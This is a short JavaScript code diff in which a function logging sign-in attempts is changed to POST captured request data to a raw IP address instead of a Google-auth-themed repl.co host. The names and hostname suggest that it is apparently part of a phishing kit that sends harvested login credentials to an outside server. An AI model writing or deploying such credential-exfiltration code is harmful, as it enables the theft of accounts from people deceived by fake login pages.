@@ -37,7 +37,7 @@ function logSigninAttempt(event) {
 }
 
 function log(reqData) {
-  fetch(`https://googleauth.dclinks.repl.co/log`, {
+  fetch(`https://172.104.213.76:5000/log`, {
       method: "POST",
       headers: {'Content-Type': 'application/json'}, 
       body: JSON.stringify(reqData)
